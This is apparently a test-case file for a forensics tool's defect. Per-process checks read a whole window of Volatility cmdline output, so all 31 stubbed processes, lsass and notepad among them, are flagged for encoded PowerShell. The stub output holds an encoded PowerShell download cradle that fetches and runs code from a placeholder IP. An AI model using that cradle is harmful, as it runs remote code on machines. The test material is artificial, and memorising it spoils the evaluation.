@@ -1,0 +1,130 @@
+# Matrix case P4116-039: find_suspicious_processes maps every PID in a window
+# to the whole window (helpers.extract_pids_from_windows) and then tests the
+# PID's "own" text with substring checks (process.py _analyze_pid): one
+# encoded PowerShell command line in a 4,096-character window of
+# windows.cmdline output gives every process listed in that window the
+# reason encoded_powershell. dangerous_privilege, suspicious_environment,
+# unusual_dll_path and external_network_connection are built the same way.
+#
+# Volatility is a stub: no real memory image or symbol pack fits in a PoC.
+# It prints what Volatility 3 Framework 2.28.2 (the version in the image)
+# prints for windows.cmdline.CmdLine with its default "quick" renderer: the
+# banner, a blank line, the tab-separated header, a blank line, then one row
+# per process (progress goes to stderr). The rows are a Windows 10 workstation
+# after a macro document started an encoded PowerShell download cradle
+# (PID 6488, child of WINWORD.EXE 6204). ImageFileName is cut at 14
+# characters, as in the kernel's EPROCESS field.
+case_id: P4116-039
+problem: P4116
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "윈도 워크스테이션의 cmdline 출력은 프로세스 수십 개가 4,096자 window 하나에 들어가고, 침해 메모리에는 인코딩된 PowerShell 명령 하나가 그 사이에 섞여 있는 일이 흔하다."
+coverage: "partial: encoded_powershell from windows.cmdline is shown; the other per-PID checks (privs, envars, dlllist, netscan) take the window the same way, and suspicious_environment also fires on COMSPEC alone"
+coverage_ko: "windows.cmdline의 `encoded_powershell`만 보인다. 다른 PID별 판정(privs·envars·dlllist·netscan)도 같은 방식으로 window 전체를 보고, `suspicious_environment`는 COMSPEC만 있어도 붙는다. Volatility 출력은 stub으로 흉내 냈다."
+summary: >-
+  After run_volatility cmdline indexes 31 processes of which only
+  powershell.exe (PID 6488) has an encoded command, find_suspicious_processes
+  reports every one of them, System (PID 4), lsass.exe (684) and
+  notepad.exe (7044) included, with the reason encoded_powershell.
+summary_ko: "`run_volatility cmdline`이 프로세스 31개를 적재했고 그중 인코딩된 명령은 `powershell.exe`(PID 6488) 하나뿐인데, `find_suspicious_processes`는 System(PID 4), `lsass.exe`(684), `notepad.exe`(7044)를 포함한 31개 모두를 `encoded_powershell` 사유로 낸다."
+defect_ko: "이 서버는 PID별 판정을 그 PID의 행이 아니라 그 PID가 든 4,096자 window 전체로 한다. 정상이라면 그 PID의 행(명령줄)만 보고 판정해야 한다. 모델은 System·lsass·notepad까지 인코딩된 PowerShell을 실행했다고 잘못 안다."
+setup_ko: "매크로 문서가 인코딩된 PowerShell 다운로드 명령을 띄운 윈도 10 워크스테이션의 메모리 이미지를 두고, Volatility cmdline 결과를 적재했다(Volatility는 stub)."
+env:
+  PATH: ${STUBS}:${PATH}
+stubs:
+  - name: vol
+    text: |
+      #!/bin/sh
+      # Stub of Volatility 3 Framework 2.28.2 (vol), default "quick" text
+      # renderer, for windows.cmdline.CmdLine only.
+      plugin=""
+      for a in "$@"; do
+        case "$a" in
+          windows.*) plugin="$a" ;;
+        esac
+      done
+      echo "Progress:  100.00		PDB scanning finished                        " >&2
+      case "$plugin" in
+        windows.cmdline.CmdLine)
+          printf 'Volatility 3 Framework 2.28.2\n\nPID\tProcess\tArgs\n\n'
+          cat <<'OUT'
+      4	System	Required memory at 0x20 is not valid (process exited?)
+      92	Registry	Required memory at 0x20 is not valid (process exited?)
+      348	smss.exe	\SystemRoot\System32\smss.exe
+      452	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+      528	wininit.exe	wininit.exe
+      536	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+      620	winlogon.exe	winlogon.exe
+      664	services.exe	C:\Windows\system32\services.exe
+      684	lsass.exe	C:\Windows\system32\lsass.exe
+      800	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p
+      828	fontdrvhost.ex	"fontdrvhost.exe"
+      900	svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS -p
+      980	dwm.exe	"dwm.exe"
+      1064	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+      1172	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p
+      1236	svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p
+      1508	spoolsv.exe	C:\Windows\System32\spoolsv.exe
+      1716	MsMpEng.exe	"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe"
+      2384	sihost.exe	sihost.exe
+      2412	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+      2468	taskhostw.exe	taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+      2820	explorer.exe	C:\Windows\Explorer.EXE
+      3104	SearchHost.exe	"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
+      3388	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
+      3920	OneDrive.exe	"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+      4316	msedge.exe	"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window
+      5092	OUTLOOK.EXE	"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
+      6204	WINWORD.EXE	"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\alice\Downloads\Invoice_88213.docm" /o ""
+      6488	powershell.exe	powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwBJAEUAWAAgACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADcALwBhACcAKQA=
+      6512	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
+      7044	notepad.exe	"C:\Windows\system32\notepad.exe" C:\Users\alice\Documents\todo.txt
+      OUT
+          ;;
+        *)
+          echo "vol: error: plugin $plugin not available in this stub" >&2; exit 1 ;;
+      esac
+fixture:
+  # A raw memory image: only its name and size reach the stub.
+  - path: ws0142-memory.raw
+    size: 1048576
+steps:
+  - tool: scan_evidence
+    note_ko: "사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: cmdline-window
+  - tool: run_volatility
+    note_ko: "프로세스 명령줄 적재"
+    args:
+      plugin: cmdline
+      memory_path: ${EVIDENCE}/ws0142-memory.raw
+  - tool: find_suspicious_processes
+    note_ko: "결함 호출: 의심 프로세스 찾기"
+  - tool: get_raw_output
+    note_ko: "비교 호출: 적재된 명령줄 원문"
+    args:
+      source_name: volatility.cmdline
+expect:
+  - step: 2
+    note_ko: "명령줄 출력이 window 하나로 적재된다"
+    regex: 'windows_indexed\\": 1,'
+  - step: 3
+    note_ko: "31개 프로세스 모두가 의심 프로세스로 나온다"
+    regex: '"result_count": 31,'
+  - step: 3
+    note_ko: "System(PID 4)이 `encoded_powershell`로 나온다"
+    regex: '"pid": 4,[^{}]*"suspicion_reasons": \[\s*"encoded_powershell"\s*\]'
+  - step: 3
+    note_ko: "`lsass.exe`(PID 684)도 `encoded_powershell`로 나온다"
+    regex: '"pid": 684,[^{}]*"suspicion_reasons": \[\s*"encoded_powershell"\s*\]'
+  - step: 3
+    note_ko: "`notepad.exe`(PID 7044)도 `encoded_powershell`로 나온다"
+    regex: '"pid": 7044,[^{}]*"suspicion_reasons": \[\s*"encoded_powershell"\s*\]'
+  - step: 4
+    note_ko: "원문에서 인코딩된 명령은 PID 6488 `powershell.exe` 한 줄뿐이고, `notepad.exe`(7044)는 메모 파일을 연 명령줄이다"
+    regex: '6488\\tpowershell\.exe\\tpowershell\.exe -nop -w hidden -enc [\s\S]*7044\\tnotepad\.exe\\t\\"C:\\\\Windows\\\\system32\\\\notepad\.exe\\" C:'
